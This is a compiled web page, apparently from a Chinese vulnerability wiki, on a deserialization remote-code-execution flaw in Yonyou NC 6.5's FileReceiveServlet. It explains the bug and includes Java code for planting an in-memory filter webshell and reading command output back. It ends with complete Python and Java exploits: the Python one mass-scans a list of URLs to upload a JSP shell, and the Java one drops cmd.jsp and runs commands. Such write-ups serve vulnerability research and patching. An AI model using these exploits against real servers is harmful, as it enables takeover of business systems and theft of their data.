import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as i,c as l,a as n,b as s,d as o,e as p}from"./app-58e4a7d6.js";const c={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"用友NC 存在反序列化 RCE漏洞，攻击者可利用控制服务器",-1),d=n("p",null,"参考阅读：",-1),v={href:"https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w",target:"_blank",rel:"noopener noreferrer"},m=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>用友NC 6.5
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;用友-UFIDA-NC&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先从任意文件上传说起</p><p>任意文件上传分析代码在<code>servlet.FileReceiveServlet</code>。在这里我们可以看到，从请求中读取流，然后转换为map类型并读取上传文件的路径。然后再读取待上传的文件。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/yongyou-5-1.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>而网上很多poc，大多都是基于此漏洞，利用反序列化上传一个文件到服务器。</p><p>这也就是去年的那个任意文件上传的反序列化漏洞。但是，但是，这个漏洞本质是一个反序列化漏洞。而且某C的classpath中，也存在apache commonscollections库，我们可以利用这个库，直接执行命令或者内存马。岂不是比任意文件上传舒服多了。</p><p><strong>内存马</strong></p><p>老样子，在反序列化中想执行任意代码，一般都依靠xalan这个库。这次也不例外。</p><p>植入内存马，关键在于我们怎样找到context，只有找到context，我们才可以添加filter。好在某c中，我们只需要通过下面的代码既可以获取当前context，不需要从tomcat中获取context</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code> <span class="token class-name">Object</span> obj <span class="token operator">=</span> 改动<span class="token class-name">Locator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">&quot;ServletContext&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> contextField <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;context&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        contextField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        obj <span class="token operator">=</span> contextField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> contextField1 <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;context&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        contextField1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">addFitlertoTomcat</span><span class="token punctuation">(</span>contextField1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>剩下的就是常规操作，可以看我之前的内存马模型，基本不需要很大的改动即可完美适配。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/yongyou-5-2.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><strong>回显</strong></p><p>我们只需要找到这样一个servlet，即存在反序列化的readObject，又将错误信息写入到response中</p><p>不难看出 uploadServlet 就很满足这个需求。</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>out = new ObjectOutputStream(output);
            in = new ObjectInputStream(request.getInputStream());
            String dsName = (String)in.readObject();
            }
        } catch (Exception var14) {
            var14.printStackTrace();
            if (out == null) {
                throw new ServletException(var14);
            }

            out.writeObject(var14);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果出错的话，将错误信息通过序列化写入到response中。好处在于，我们不需要麻烦的去找tomcat的response对象。</p><p>所以，我们将反序列化的payload，发送给uploadServlet即可。然后我们只需要读取响应，即可拿到服务器命令执行的回显结果。客户端代码可以这样写</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Exception</span> e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span><span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> obj <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getCause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> targetF <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;target&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        targetF<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        obj <span class="token operator">=</span> targetF<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> msgF <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">&quot;detailMessage&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        msgF<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> msg <span class="token operator">=</span> msgF<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="文件上传exp" tabindex="-1"><a class="header-anchor" href="#文件上传exp" aria-hidden="true">#</a> 文件上传EXP</h3><p>python exp：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import requests
import threadpool
import urllib3
import sys
import argparse

urllib3.disable_warnings()
proxies = {&#39;http&#39;: &#39;http://localhost:8080&#39;, &#39;https&#39;: &#39;http://localhost:8080&#39;}
header = {
    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
    &quot;Referer&quot;: &quot;https://google.com&quot;,
}

def multithreading(funcname, filename=&quot;url.txt&quot;, pools=5):
    works = []
    with open(filename, &quot;r&quot;) as f:
        for i in f:
            func_params = [i.rstrip(&quot;\\n&quot;)]
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def wirte_targets(vurl, filename):
    with open(filename, &quot;a+&quot;) as f:
        f.write(vurl + &quot;\\n&quot;)
        return vurl
    
def exp(u):
    uploadHeader = {
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;,
        &quot;Content-Type&quot;: &quot;multipart/form-data;&quot;,
        &quot;Referer&quot;: &quot;https://google.com&quot;
    }
    uploadData = &quot;\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x02\\x74\\x00\\x09\\x46\\x49\\x4c\\x45\\x5f\\x4e\\x41\\x4d\\x45\\x74\\x00\\x09\\x74\\x30\\x30\\x6c\\x73\\x2e\\x6a\\x73\\x70\\x74\\x00\\x10\\x54\\x41\\x52\\x47\\x45\\x54\\x5f\\x46\\x49\\x4c\\x45\\x5f\\x50\\x41\\x54\\x48\\x74\\x00\\x10\\x2e\\x2f\\x77\\x65\\x62\\x61\\x70\\x70\\x73\\x2f\\x6e\\x63\\x5f\\x77\\x65\\x62\\x78&quot;
    shellFlag=&quot;t0test0ls&quot;
    uploadData+=shellFlag
    try:
        req1 = requests.post(u + &quot;/servlet/FileReceiveServlet&quot;, headers=uploadHeader, verify=False, data=uploadData, timeout=25)
        if req1.status_code == 200 :
            req3=requests.get(u+&quot;/t00ls.jsp&quot;,headers=header, verify=False, timeout=25)

            if  req3.text.index(shellFlag)&gt;=0:
                printFlag = &quot;[Getshell]&quot; + u+&quot;/t00ls.jsp&quot;  + &quot;\\n&quot;
                print (printFlag)
                wirte_targets(printFlag, &quot;vuln.txt&quot;)
    except :
        pass
    #print(printFlag, end=&quot;&quot;)


if __name__ == &quot;__main__&quot;:
    if (len(sys.argv)) &lt; 2:
        print(&#39;useage : python&#39; +str(sys.argv[0]) + &#39; -h&#39;)
    else:
        parser =argparse.ArgumentParser()
        parser.description =&#39;YONYOU UC 6.5 FILE UPLOAD!&#39;
        parser.add_argument(&#39;-u&#39;,help=&quot;url -&gt; example http://127.0.0.1&quot;,type=str,dest=&#39;check_url&#39;)
        parser.add_argument(&#39;-r&#39;,help=&quot;url list to file&quot;,type=str,dest=&#39;check_file&#39;)
        args =parser.parse_args()
        if args.check_url:
            exp(args.check_url)
        
        if(args.check_file):
            multithreading(exp, args.check_file, 8) 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>java exp：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class App {
    public static void main(String[] args) throws Exception {
        String url=&quot;http://192.168.40.222&quot;;
        Map&lt;String, Object&gt; metaInfo=new HashMap&lt;String, Object&gt;();
        metaInfo.put(&quot;TARGET_FILE_PATH&quot;,&quot;webapps/nc_web&quot;);
        metaInfo.put(&quot;FILE_NAME&quot;,&quot;cmd.jsp&quot;);
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(metaInfo);
        InputStream in=App.class.getResourceAsStream(&quot;cmd.jsp&quot;);
        byte[] buf=new byte[1024];
        int len=0;
        while ((len=in.read(buf))!=-1){
            baos.write(buf,0,len);
        }
        HttpClient.post(url+&quot;/servlet/FileReceiveServlet&quot;,baos.toByteArray());
        HttpResult result=HttpClient.get(url+&quot;/cmd.jsp?cmd=echo+aaaaaa&quot;);
        if(result.getData().contains(&quot;aaaaaa&quot;)){
            System.out.println(&quot;shell路径:&quot;+url+&quot;/cmd.jsp?cmd=whoami&quot;);
        }else{
            System.out.println(&quot;上传shell失败或者漏洞不存在&quot;);
        }
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,28);function x(b,k){const a=t("ExternalLinkIcon");return i(),l("div",null,[u,r,d,n("ul",null,[n("li",null,[n("a",v,[s("https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w"),o(a)])])]),m])}const f=e(c,[["render",x],["__file","用友 NC FileReceiveServlet 反序列化RCE漏洞.html.vue"]]);export{f as default};
